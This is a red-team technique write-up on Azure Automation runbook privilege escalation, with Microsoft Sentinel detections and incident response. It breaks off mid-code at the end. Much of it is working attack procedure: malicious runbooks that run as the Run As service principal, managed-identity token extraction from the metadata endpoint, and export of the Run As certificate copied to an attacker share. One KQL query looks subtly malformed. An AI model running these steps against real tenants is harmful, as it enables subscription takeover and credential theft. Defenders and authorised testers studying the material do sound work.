# [PE-ACCTMGMT-008]: Azure Automation Runbook Escalation

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-008 |
| **MITRE ATT&CK v18.1** | [Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation, Persistence |
| **Platforms** | Entra ID, Azure |
| **Severity** | Critical |
| **CVE** | CVE-2025-29827 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Azure Automation (All Current Versions) |
| **Patched In** | Microsoft Recommends Immediate Remediation |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Automation Accounts are designed to automate administrative tasks across Azure subscriptions using Runbooks (PowerShell or Python scripts). When an Automation Account is created with an Azure "Run As" account, Microsoft automatically creates a service principal in Entra ID and assigns it **Contributor role** at the subscription level. An attacker with permissions to create, edit, or execute runbooks can leverage this service principal's credentials to achieve full subscription-level privilege escalation. This is particularly dangerous because the "Run As" service principal is often the path of least resistance to subscription-wide compromise.

**Attack Surface:** Automation Accounts, Runbook execution context, "Run As" service principal, Hybrid Workers (Windows/Linux VMs with Automation Agent), and managed identities assigned to the Automation Account.

**Business Impact:** **Catastrophic.** Attackers gaining control of an Automation Account can execute code with subscription-level privileges, potentially compromising entire Azure subscriptions, deleting resources, stealing data, creating persistence mechanisms, and moving laterally to other cloud services and on-premises infrastructure via Hybrid Workers.

**Technical Context:** This attack requires the attacker to already have **at least** one of these roles in the target subscription:
- Automation Contributor
- Contributor
- Owner

Execution is rapid (<2 minutes) and generates minimal detectable events if the Automation Account is already configured with "Run As" and has sufficient permissions.

### Operational Risk
- **Execution Risk:** Medium – Requires existing role with Automation permissions; CVE-2025-29827 makes this even easier if unpatched.
- **Stealth:** Medium – Activity generates AuditLog entries but can blend with legitimate administrative tasks.
- **Reversibility:** No – If used for credential extraction or resource deletion, actions are irreversible without restoration from backup.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.4 | Ensure that 'Automation Account' has managed identity enabled |
| **DISA STIG** | AZ-3.2 | Azure Role-Based Access Control (RBAC) must be properly configured |
| **CISA SCuBA** | AC-3.1 | Enforce least privilege on service principals and managed identities |
| **NIST 800-53** | AC-3 | Access Enforcement – Enforce authorization policies for resource access |
| **NIST 800-53** | AC-6 | Least Privilege – Limit service principal rights to minimum necessary |
| **GDPR** | Art. 32 | Security of Processing – Implement access controls and encryption |
| **DORA** | Art. 9 | Protection and Prevention – Incident response and privilege limitation |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – Policy for privileged access |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights – Control service principals |
| **ISO 27005** | 8.3.2 | Risk Scenario: Compromise of Azure Automation credentials |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- One of the following Azure RBAC roles:
  - **Automation Contributor** – Can create, edit, run, and delete runbooks
  - **Contributor** – Can manage all Azure resources
  - **Owner** – Can manage all Azure resources and assign roles
  - **User Access Administrator** – Can manage role assignments only (limited attack surface)

**Required Access:**
- Network access to Azure Portal (https://portal.azure.com) or Azure CLI/PowerShell from any network location
- Valid Azure credentials (OAuth token, username/password, or service principal credentials)

**Supported Versions:**
- **Azure Automation:** All current versions (no version-specific mitigations; vulnerability is architectural)
- **PowerShell:** PowerShell 5.1+ (for runbook execution)
- **Python:** Python 3.8+ (for Python runbooks)

**Required Tools:**
- [Azure PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/new-azureps-module-az) (Version 10.0.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.50.0+)
- [Azure Automation Runbook Editor](https://portal.azure.com) (Web-based)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Check 1: Verify Automation Account Exists in Subscription**

```powershell
# Connect to Azure
Connect-AzAccount

# List all Automation Accounts in the subscription
Get-AzAutomationAccount | Select-Object ResourceGroupName, AutomationAccountName, Location
```

**What to Look For:**
- Automation Accounts with "Run As Account" enabled (indicates service principal with Contributor role)
- Accounts in Resource Groups where you have "Automation Contributor" or "Contributor" role

**Check 2: Verify Current User's Permissions on Automation Account**

```powershell
# Get the Automation Account
$AutomationAccount = Get-AzAutomationAccount -ResourceGroupName "YourRG" -Name "YourAutoAccount"

# Check your own role assignment
Get-AzRoleAssignment -Scope $AutomationAccount.Id | Where-Object {$_.SignInName -eq (Get-AzContext).Account.Id} | Select-Object RoleDefinitionName, Scope
```

**What to Look For:**
- If role is "Automation Contributor", "Contributor", or "Owner", the attack is viable.
- If role is "Reader" or "Automation Operator", the attack is **not** directly viable but lateral movement is still possible.

**Check 3: Verify "Run As Account" Configuration**

```powershell
# Get the Run As Account (service principal) linked to the Automation Account
Get-AzAutomationAccount -ResourceGroupName "YourRG" -Name "YourAutoAccount" | Select-Object AutomationAccountName

# Check if automation account has a managed identity
$aa = Get-AzAutomationAccount -ResourceGroupName "YourRG" -Name "YourAutoAccount"
$aa | Select-Object -ExpandProperty Identity
```

**What to Look For:**
- If the Automation Account was created **with** "Create Run As Account" enabled, a service principal exists with Contributor role.
- If a managed identity is assigned, you can escalate via the identity instead.

**Check 4: List All Runbooks in the Account (Reconnaissance)**

```powershell
# List all runbooks in the Automation Account
Get-AzAutomationRunbook -ResourceGroupName "YourRG" -AutomationAccountName "YourAutoAccount" | Select-Object Name, RunbookType, CreationTime, LastModifiedTime
```

**What to Look For:**
- Existing runbooks that might already have malicious payloads
- "PowerShell" runbooks (most common attack vector)
- "Python" runbooks (also viable but less common)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Creating a Malicious Runbook via Azure Portal

**Supported Versions:** All current Azure Automation versions

#### Step 1: Navigate to the Target Automation Account

**Objective:** Access the Automation Account where you have Automation Contributor or Contributor role.

**Manual Steps:**
1. Navigate to **Azure Portal** (https://portal.azure.com)
2. Search for **"Automation Accounts"** in the search bar
3. Click on your target **Automation Account**
4. Verify you see the account name, subscription, and resource group
5. Note the **"Run As Accounts"** section on the left menu (if present, the account has a service principal)

**Expected Output:**
- You should see the Automation Account dashboard with options for Runbooks, Credentials, Modules, etc.

**What This Means:**
- Successfully accessing the account confirms your permissions are sufficient.
- If "Run As Accounts" section is visible, the service principal already exists.

#### Step 2: Create a New Runbook

**Objective:** Create a malicious PowerShell runbook that will run with the Automation Account's service principal context.

**Manual Steps:**
1. In the Automation Account, click **"Runbooks"** (left menu under Process Automation)
2. Click **"+ Create a runbook"**
3. Enter a **Name** (e.g., "AdminTask_Sync" to blend with legitimate names)
4. Select **Runbook type: PowerShell**
5. Select **Runtime version: 5.1** or **7.2** (7.2 is newer, more capable)
6. Click **Create**

**Expected Output:**
- A new runbook editor window opens with empty PowerShell template

**What This Means:**
- You now have write access to the Automation Account and can execute code under its service principal.

#### Step 3: Inject Malicious PowerShell Code

**Objective:** Write PowerShell code that executes with the service principal's privileges.

**Malicious Runbook Code (Option A: List All Subscriptions):**

```powershell
# Authenticate using the Automation Account's "Run As" service principal
$connection = Get-AutomationConnection -Name AzureRunAsConnection

# Verify the connection (if Run As account is configured)
if ($connection) {
    Add-AzAccount -ServicePrincipal `
        -Tenant $connection.TenantID `
        -ApplicationId $connection.ApplicationID `
        -CertificateThumbprint $connection.CertificateThumbprint `
        -ErrorAction Stop | Out-Null
    
    Write-Output "Authenticated as: $($connection.ApplicationID)"
    
    # Execute privileged action: List all subscriptions
    Get-AzSubscription | Select-Object SubscriptionName, SubscriptionId
    
    # Example: Get all resource groups across subscriptions
    $subscriptions = Get-AzSubscription
    foreach ($sub in $subscriptions) {
        Set-AzContext -SubscriptionId $sub.SubscriptionId | Out-Null
        Get-AzResourceGroup | Select-Object ResourceGroupName, Location, @{Name="Subscription";Expression={$sub.SubscriptionName}}
    }
} else {
    Write-Output "Run As Connection not found. Using managed identity fallback..."
}
```

**Malicious Runbook Code (Option B: Escalate to Global Admin via Entra ID):**

```powershell
# Get Automation Connection
$connection = Get-AutomationConnection -Name AzureRunAsConnection

if ($connection) {
    # Connect as service principal
    Add-AzAccount -ServicePrincipal `
        -Tenant $connection.TenantID `
        -ApplicationId $connection.ApplicationID `
        -CertificateThumbprint $connection.CertificateThumbprint `
        -ErrorAction Stop | Out-Null
    
    # Install and import Microsoft Graph module
    Update-AzModule -AzureModuleClass "Az.Accounts"
    
    # Connect to Microsoft Graph using the service principal
    $graphToken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
    
    # Add yourself as Global Administrator (WARNING: Highly malicious)
    # Example: Assign Global Admin role to attacker's user account
    $targetUserId = "attacker@contoso.onmicrosoft.com"
    
    # Note: This requires Microsoft Graph permissions to be granted to the service principal
    Write-Output "Escalation payload - requires Microsoft Graph permissions"
}
```

**Malicious Runbook Code (Option C: Extract Managed Identity Token):**

```powershell
# Extract the Automation Account's managed identity token
$headers = @{}
$headers.Add("Metadata", "true")
$headers.Add("X-IDENTITY-HEADER", (Get-Item -Path "Env:\IDENTITY_HEADER").Value)

# Request token for Azure Management
$uri = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
$response = Invoke-RestMethod -Uri $uri -Method GET -Headers $headers

# Extract and output the token
$token = $response.access_token
Write-Output "Managed Identity Token: $token"

# Use the token to list all resources in the subscription
$headers = @{"Authorization" = "Bearer $token"}
$resourceUri = "https://management.azure.com/subscriptions/{subscriptionId}/resources?api-version=2021-04-01"
$resources = Invoke-RestMethod -Uri $resourceUri -Method GET -Headers $headers
$resources.value | Select-Object name, type, location
```

#### Step 4: Save and Publish the Runbook

**Objective:** Finalize the runbook so it's ready for execution.

**Manual Steps:**
1. Paste one of the malicious code examples above into the runbook editor
2. Click **Save** (top-left corner)
3. Click **Publish** (appears after save) – **This is required for the runbook to be executable**
4. Confirm publication by clicking **Yes**

**Expected Output:**
- Runbook status changes from "Edit" to "Published"
- A blue notification appears: "Runbook published successfully"

**What This Means:**
- The runbook is now executable and will run with the Automation Account's service principal context.

#### Step 5: Execute the Runbook

**Objective:** Trigger runbook execution to extract credentials or perform privilege escalation.

**Manual Steps:**
1. Click **Start** (top toolbar) to execute the runbook
2. A **Job** is created in the left menu under "Jobs"
3. Wait 30-60 seconds for execution
4. Click on the **Job ID** to view output
5. In the **Output** tab, view the results of your malicious code

**Expected Output (Option A):**
```
Authenticated as: 1a234b56-78cd-90ef-1234-567890abcdef
SubscriptionName                  SubscriptionId
------------------                ------
Production-Subscription           00000000-1111-2222-3333-444444444444
Development-Subscription          11111111-2222-3333-4444-555555555555
```

**Expected Output (Option B):**
```
Escalation payload - requires Microsoft Graph permissions
```

**What This Means:**
- The runbook executed successfully under the service principal's context.
- You now have proof that arbitrary code runs with subscription-level privileges.
- Any action the service principal can perform (create VMs, delete resources, etc.) is now possible.

---

### METHOD 2: Extracting "Run As" Certificate via PowerShell (Hybrid Worker Attack)

**Supported Versions:** All current Azure Automation versions

**Precondition:** You must have access to a **Hybrid Worker VM** (Windows or Linux with Azure Automation Hybrid Worker Extension installed).

#### Step 1: Identify Hybrid Worker VMs

**Objective:** Find VMs configured as Automation Account Hybrid Workers.

**Command (PowerShell):**
```powershell
# Connect to Azure
Connect-AzAccount

# Get all VMs with the Hybrid Worker Extension installed
$vms = Get-AzVM | Where-Object {
    $extensions = $_.Extensions
    $extensions | Where-Object {$_.VirtualMachineExtensionType -like "*HybridWorker*" -or $_.Publisher -eq "Microsoft.GuestConfiguration"}
}

# List the Hybrid Worker VMs
$vms | Select-Object ResourceGroupName, Name, Location, @{Name="AutomationAccount";Expression={
    # Extract the automation account name from the extension config (if visible)
    ($_.Extensions | Where-Object {$_.VirtualMachineExtensionType -like "*HybridWorker*"}).Settings
}}
```

**What to Look For:**
- VMs with extensions containing "HybridWorker" or "GuestConfiguration"
- Resource Groups containing these VMs often have the Automation Account in the same RG

**Version Note:** If this command doesn't list Hybrid Workers clearly, use the Azure Portal:
1. Go to **Automation Accounts** → Select target account
2. Click **Hybrid worker groups** (left menu under "Process Automation")
3. Click a group name to see the list of worker VMs

#### Step 2: Gain Access to the Hybrid Worker VM

**Objective:** Obtain local administrator access to the Hybrid Worker VM.

**Methods (in order of preference):**
1. **Virtual Machine Administrator Login** – Direct RDP/SSH if you have the Azure RBAC role
2. **Virtual Machine Contributor + Run Command** – Use `az vm run-command` to execute code as SYSTEM
3. **Direct RDP/SSH** – If you have Windows/Linux credentials

**Command (Virtual Machine Contributor with Run Command):**
```powershell
# Run a command on the Hybrid Worker VM as SYSTEM (Windows)
Invoke-AzVMRunCommand -ResourceGroupName "YourRG" -VMName "HybridWorkerVM" `
    -CommandId "RunPowerShellScript" `
    -ScriptPath "C:\temp\extract_cert.ps1"
```

**What This Means:**
- Code executes with SYSTEM privileges on the VM
- The "Run As" certificate (if installed) is accessible at: `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\`

#### Step 3: Extract "Run As" Certificate from Hybrid Worker

**Objective:** Locate and export the "Run As" service principal certificate installed on the Hybrid Worker.

**Command (PowerShell on Hybrid Worker):**
```powershell
# Find the Automation Account "Run As" certificate
# Typical installation path:
$certPath = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\"

# List certificates in the store
Get-ChildItem -Path "Cert:\LocalMachine\My\" | Where-Object {$_.Subject -like "*Automation*"} | Select-Object Thumbprint, Subject, NotAfter

# Export the certificate (private key) to a PFX file
$cert = Get-ChildItem -Path "Cert:\LocalMachine\My\" | Where-Object {$_.Subject -like "*Automation*"} | Select-Object -First 1
Export-PfxCertificate -Cert $cert -FilePath "C:\temp\automation_cert.pfx" -Password (ConvertTo-SecureString -String "password123" -AsPlainText -Force)

# Copy the PFX file to your attacker machine
Copy-Item -Path "C:\temp\automation_cert.pfx" -Destination "\\AttackerIP\Share\automation_cert.pfx"
```

**Expected Output:**
```
Thumbprint                               Subject                          NotAfter
----------                               -------                          --------
1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D        CN=MyAutomationAccount           12/31/2025
```

**What This Means:**
- You now have the private certificate in PFX format
- This certificate is the "Run As" account's credential
- It can be used to authenticate as the service principal from any machine

#### Step 4: Authenticate as the "Run As" Service Principal

**Objective:** Use the extracted certificate to gain full subscription access.

**Command (PowerShell from Attacker Machine):**
```powershell
# Import the extracted PFX certificate
$cert = Import-PfxCertificate -FilePath "C:\temp\automation_cert.pfx" -CertStoreLocation "Cert:\CurrentUser\My\" -Password (ConvertTo-SecureString -String "password123" -AsPlainText -Force)

# Get the service principal details (you'll need the tenant ID and App ID)
# These can be found in the Automation Account > Run As Accounts section
$tenantId = "12345678-1234-1234-1234-123456789012"
$appId = "87654321-4321-4321-4321-210987654321"
$certThumbprint = $cert.Thumbprint

# Authenticate as the service principal
Connect-AzAccount -ServicePrincipal `
    -Tenant $tenantId `
    -ApplicationId $appId `
    -CertificateThumbprint $certThumbprint

# Verify authentication success
Get-AzContext | Select-Object Account, Subscription, Tenant

# Now execute any subscription-level command
Get-AzSubscription | Select-Object SubscriptionName, SubscriptionId
Get-AzResourceGroup | Select-Object ResourceGroupName, Location
```

**Expected Output:**
```
Account                              Subscription                       Tenant
-------                              ----                               ------
87654321-4321-4321-4321-210987654321 Production-Sub (00000000-...)      12345678-1234-1234-1234-123456789012
```

**What This Means:**
- You now have full subscription access using the extracted certificate
- All actions performed are attributed to the service principal, not your user account
- Privilege escalation is complete: from Reader/Contributor → Subscription-level access

---

### METHOD 3: Exploiting CVE-2025-29827 (Authorization Bypass)

**Supported Versions:** All Azure Automation versions prior to Microsoft's patch (verify via MSRC)

**Precondition:** CVE-2025-29827 must not be patched. Check the Azure Security Update Guide for patched versions.

#### Step 1: Verify Vulnerability Presence

**Objective:** Confirm that the Automation Account is vulnerable to CVE-2025-29827.

**Manual Steps:**
1. Have the vulnerable Automation Account access
2. Create a runbook with a simple test payload:
```powershell
Write-Output "Test payload executed"
```
3. Assign the runbook to a non-owner user with minimal permissions
4. If the user can execute the runbook without explicit permission, vulnerability is present

**What This Means:**
- Improper authorization checks exist in the deployment
- Users with lower permissions can perform higher-privilege actions

#### Step 2: Bypass Authorization Checks

**Objective:** Use the CVE-2025-29827 authorization bypass to escalate from limited role to full Automation Account control.

**Attack Vector:**
- User with **Reader** role on the subscription → Can modify runbooks in Automation Account (should not be possible)
- User with **Automation Operator** role → Can create runbooks and run them as service principal (should require Automation Contributor)

**Exploitation Steps:**
1. As a lower-privilege user, attempt to modify or create a runbook via REST API:

```powershell
$token = (Get-AzAccessToken).Token
$headers = @{"Authorization" = "Bearer $token"}

# Attempt to create a runbook with Reader-level permissions
$uri = "https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Automation/automationAccounts/{accountName}/runbooks/{runbookName}?api-version=2023-11-01"

$payload = @{
    properties = @{
        description = "Malicious runbook"
        type        = "PowerShell"
        runbookType = "PowerShell"
    }
    location = "eastus"
} | ConvertTo-Json

Invoke-RestMethod -Uri $uri -Method PUT -Headers $headers -ContentType "application/json" -Body $payload
```

**Expected Output (If Vulnerable):**
```
HTTP 201 Created – Runbook created despite insufficient permissions
```

**Expected Output (If Patched):**
```
HTTP 403 Forbidden – User does not have 'Microsoft.Automation/automationAccounts/runbooks/write' permission
```

**What This Means:**
- If 201 is returned, CVE-2025-29827 is exploitable
- Privilege escalation from Reader → Subscriber-level access is possible

---

## 6. ATTACK SIMULATION & VERIFICATION

This section has been removed for this technique as no Atomic Red Team test currently exists specifically for Azure Automation Runbook Escalation in the published Atomic Red Team repository (as of 2025-01-09).

**Note:** The attack vector described above in Methods 1-3 can be replicated in a controlled red team environment with proper authorization and rule of engagement (RoE).

---

## 7. TOOLS & COMMANDS REFERENCE

### Azure PowerShell Module (Az)

**Version:** 11.0.0+ (Released December 2024)
**Minimum Version:** 10.0.0
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```powershell
# Install from PowerShell Gallery
Install-Module -Name Az -Repository PSGallery -AllowClobber -Force

# Update existing installation
Update-Module -Name Az
```

**Key Commands for This Attack:**

| Command | Purpose |
|---|---|
| `Get-AzAutomationAccount` | List all Automation Accounts in subscription |
| `New-AzAutomationRunbook` | Create a new runbook |
| `Publish-AzAutomationRunbook` | Publish runbook for execution |
| `Start-AzAutomationRunbook` | Execute a runbook |
| `Get-AzAutomationJob` | Retrieve runbook execution results |
| `Get-AzAutomationConnection` | List credentials/connections in Automation Account |
| `Get-AzAccessToken` | Extract OAuth token for API calls |

**One-Liner Attack (Option A: List All Subscriptions):**
```powershell
Connect-AzAccount; Get-AzSubscription | Select-Object SubscriptionName, SubscriptionId
```

**One-Liner Attack (Option B: Extract Managed Identity Token via Runbook):**
```powershell
# Create and execute a runbook that extracts tokens
$aa = Get-AzAutomationAccount -ResourceGroupName "RG" -Name "AA"; New-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA" -Name "ExtractToken" -Type PowerShell -Description "Token Extraction"; Publish-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA" -Name "ExtractToken"; Start-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA" -Name "ExtractToken"
```

### Azure CLI

**Version:** 2.55.0+
**Installation:**
```bash
# macOS (Homebrew)
brew install azure-cli

# Linux (apt)
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Windows (MSI)
# Download from https://aka.ms/installazurecliwindows
```

**Key Commands:**
```bash
# List Automation Accounts
az automation account list --query "[].{Name:name, ResourceGroup:resourceGroup}"

# Create a runbook
az automation runbook create --resource-group "RG" --automation-account-name "AA" \
  --name "MaliciousRunbook" --type "PowerShell"

# Publish and run
az automation runbook publish --resource-group "RG" --automation-account-name "AA" \
  --name "MaliciousRunbook"

az automation runbook start --resource-group "RG" --automation-account-name "AA" \
  --name "MaliciousRunbook"
```

### Automation Account REST API

**Endpoint:** `https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Automation/automationAccounts/{automationAccountName}`

**Authentication:** Bearer token (OAuth 2.0)

**Create Runbook via REST API:**
```bash
curl -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d @runbook.json \
  "https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Automation/automationAccounts/{aa}/runbooks/MaliciousRunbook?api-version=2023-11-01"
```

**runbook.json:**
```json
{
  "properties": {
    "runbookType": "PowerShell",
    "description": "Malicious runbook"
  },
  "location": "eastus"
}
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Suspicious Runbook Creation or Modification

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, Properties (ResourceId, ModifiedProperties)
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Azure Automation deployments

**KQL Query:**
```kusto
AuditLogs
| where OperationName in (
    "Create runbook",
    "Update runbook",
    "Publish runbook",
    "Create automation account",
    "Create or update run as account"
)
| where Result == "Success"
| extend ResourceId = tostring(InitiatedBy.user.id)
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, Result, ResourceId
| summarize 
    CreationCount = count(),
    FirstEvent = min(TimeGenerated),
    LastEvent = max(TimeGenerated),
    Accounts = make_set(InitiatedBy.user.userPrincipalName, 10)
    by OperationName, ResourceId
| where CreationCount > 3 or (LastEvent - FirstEvent) < 1h
| sort by FirstEvent desc
```

**What This Detects:**
- Unusual or rapid creation of multiple runbooks
- Modifications to existing runbooks by non-expected users
- Publish operations indicating runbook activation

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Azure Automation - Suspicious Runbook Activity`
   - Severity: `High`
   - Tactics: `Persistence, Privilege Escalation`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `ResourceId, OperationName`
7. Click **Review + create**

#### Query 2: Runbook Execution with Elevated Privileges

**KQL Query:**
```kusto
AuditLogs
| where OperationName in (
    "Start runbook",
    "Run runbook on hybrid worker"
)
| where Result == "Success"
| extend 
    CallerPrincipal = tostring(InitiatedBy.user.userPrincipalName),
    RunbookName = tostring(TargetResources[0].displayName),
    SubscriptionId = tostring(split(TargetResources[0].id, "/")[2])
| where RunbookName has_any ("extract", "credential", "token", "export", "admin", "escalat")
| project TimeGenerated, CallerPrincipal, RunbookName, SubscriptionId, TargetResources, Result
| sort by TimeGenerated desc
```

**What This Detects:**
- Execution of runbooks with suspicious names ("extract", "credential", "escalat", etc.)
- High-frequency execution from unusual users

#### Query 3: Managed Identity Token Extraction

**KQL Query:**
```kusto
AuditLogs
| where OperationName in (
    "Get automation account",
    "List automation account connections",
    "Get credentials from automation account"
)
| where Result == "Success"
| extend
    CallerIpAddress = tostring(InitiatedBy.user.ipAddress),
    CallerPrincipal = tostring(InitiatedBy.user.userPrincipalName),
    AutomationAccountName = tostring(TargetResources[0].displayName)
| where CallerIpAddress !in (
    "127.0.0.1",  -- Whitelist trusted IPs
    "10.0.0.0/8"  -- Internal network ranges
)
| summarize
    AccessCount = count(),
    FirstAccess = min(TimeGenerated),
    LastAccess = max(TimeGenerated),
    Resources = make_set(AutomationAccountName, 10)
    by CallerPrincipal, CallerIpAddress
| where AccessCount > 5
| sort by AccessCount desc
```

**What This Detects:**
- Multiple attempts to access Automation Account credentials or connections
- Token extraction attempts from unusual IP addresses

---

## 9. WINDOWS EVENT LOG MONITORING

This section has been removed as Azure Automation is a cloud-native service with no on-premises Windows Event Log footprint.

**Note:** All activity is logged in **Azure AuditLogs** and **Activity Log** within the Azure Portal and Microsoft Sentinel, as covered in Section 8.

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious Automation Account Activity

**Alert Name:** "Suspicious Automation Account Runbook Execution Detected"
- **Severity:** High
- **Description:** MDC detects when runbooks are created, modified, or executed by non-authorized users or from unusual locations
- **Applies To:** All subscriptions with Defender for Cloud enabled
- **Remediation:** Review the runbook source code, verify the user's permissions, and disable the runbook if malicious

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, ensure these are enabled:
   - **Defender for Cloud Apps**: ON (monitors cloud activity)
   - **Defender for Resource Manager**: ON (monitors API activity)
5. Click **Save**
6. Go to **Security alerts** → **View all alerts** to see triggered detections

#### Custom Detection Rule (Automation Account Abuse)

**Alert Rule:**
- **Trigger:** When AuditLog shows "Start runbook" + "Create runbook" within 5 minutes by same user
- **Action:** Generate High-severity alert
- **Investigation:** Check runbook source code for credential extraction patterns

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Cloud Logs:**
- AuditLog operations: `Create runbook`, `Update runbook`, `Publish runbook`, `Start runbook`
- Runbook names containing: "extract", "credential", "token", "escalat", "admin", "bypass"
- Automation Account connection/credentials enumeration
- Unusual user executing runbooks (non-service account)

**Managed Identity Token Exposure:**
- Runbook code containing: `http://169.254.169.254/metadata/identity/oauth2/token` (metadata endpoint)
- Access to `/metadata` endpoint from runbook context
- Tokens captured in logs or exfiltrated

**"Run As" Certificate Extraction:**
- File access to `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\` on Hybrid Workers
- Export-PfxCertificate cmdlet execution on Hybrid Worker
- Certificate files transferred to attacker infrastructure

### Forensic Artifacts

**Cloud Storage:**
- **Azure AuditLogs:** All operations logged with timestamps, user identity, IP address
- **Activity Log:** Resource creation/modification history with caller information
- **Automation Account Job History:** Runbook execution results and output
- **Storage Account (if used):** Credentials or tokens stored in blob containers

**Runbook Source Code:**
- **Location:** Azure Portal → Automation Account → Runbooks → [RbookName] → Edit
- **Path in Blob Storage:** `https://{storageAccount}.blob.core.windows.net/automation-runbooks/`
- **Evidence:** Malicious code, token extraction, API calls to exfiltrate data

**Hybrid Worker Artifacts (Windows):**
- **Certificate Store:** `Cert:\LocalMachine\My\` (Automation "Run As" certificate)
- **Temporary Files:** `C:\Temp\`, `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\`
- **Event Logs:** Windows Security Log (Event ID 4663 - File access to certificate store)

### Response Procedures

#### 1. Immediate Isolation (0-5 minutes)

**Disable Runbook Execution:**

```powershell
# Disconnect runbooks from "Run As" account
$aa = Get-AzAutomationAccount -ResourceGroupName "RG" -Name "AA"

# Disable all runbooks
Get-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA" | ForEach-Object {
    Disable-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA" -Name $_.Name -Force
}

# Remove "Run As" account
# Manual: Azure Portal → Automation Accounts → [Account] → Run As Accounts → Delete
```

**Revoke "Run As" Service Principal:**

```powershell
# Find and disable the service principal
$spId = (Get-AzAutomationAccount -ResourceGroupName "RG" -Name "AA").Identity.PrincipalId
Disable-AzADServicePrincipal -ObjectId $spId

# Or delete it permanently (WARNING: impacts legitimate automation)
Remove-AzADServicePrincipal -ObjectId $spId -Force
```

**Manual (Azure Portal):**
1. Go to **Entra ID** → **Enterprise applications** → Search for Automation Account service principal
2. Click **Delete** → Confirm

#### 2. Forensic Preservation (5-30 minutes)

**Export Audit Logs:**

```powershell
# Export AuditLogs for the past 24 hours
$startDate = (Get-Date).AddDays(-1)
$endDate = Get-Date

$logs = Get-AzLog -StartTime $startDate -EndTime $endDate | Where-Object {
    $_.ResourceId -like "*Microsoft.Automation*"
}

$logs | Export-Csv -Path "C:\Evidence\AuditLogs.csv" -NoTypeInformation
```

**Export Runbook Source Code:**

```powershell
# Get all runbooks and their content
$runbooks = Get-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA"

foreach ($rb in $runbooks) {
    $content = Export-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA" -Name $rb.Name
    $content | Out-File -FilePath "C:\Evidence\Runbook_$($rb.Name).ps1"
}
```

**Capture Hybrid Worker Certificates (if applicable):**

```powershell
# On Hybrid Worker VM, export certificates for forensic analysis
Get-ChildItem -Path "Cert:\LocalMachine\My\" | Where-Object {$_.Subject -like "*Automation*"} | Export-PfxCertificate `
    -FilePath "C:\Evidence\Automation_Certs_$(Get-Date -Format 'yyyyMMdd_HHmmss').pfx" `
    -Password (ConvertTo-SecureString -String "ForensicOnly" -AsPlainText -Force)
```

#### 3. Threat Remediation (30 minutes - 2 hours)

**Delete Malicious Runbooks:**

```powershell
# Remove the malicious runbook created by attacker
Remove-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA" -Name "MaliciousRunbook" -Force

# Remove all suspicious runbooks (manually review first)
Get-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA" |  Where-Object {
    $_.Name -in @("ExtractToken", "PrivilegeEscalation", "AdminTask_Sync", "DataExfiltration")
} | Remove-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA" -Force
```

**Reset Automation Account Permissions:**

```powershell
# Get the Automation Account's original "Run As" service principal
$aa = Get-AzAutomationAccount -ResourceGroupName "RG" -Name "AA"
$spId = $aa.Identity.PrincipalId

# Remove the compromised service principal and create a new one
Remove-AzRoleAssignment -ObjectId $spId -RoleDefinitionName "Contributor" -Scope "/subscriptions/{subscriptionId}"

# (Recommended) Use managed identity instead of "Run As" account
# Manual: Automation Accounts → [Account] → Identity → System assigned → ON
```

**Revoke Stolen Credentials:**

```powershell
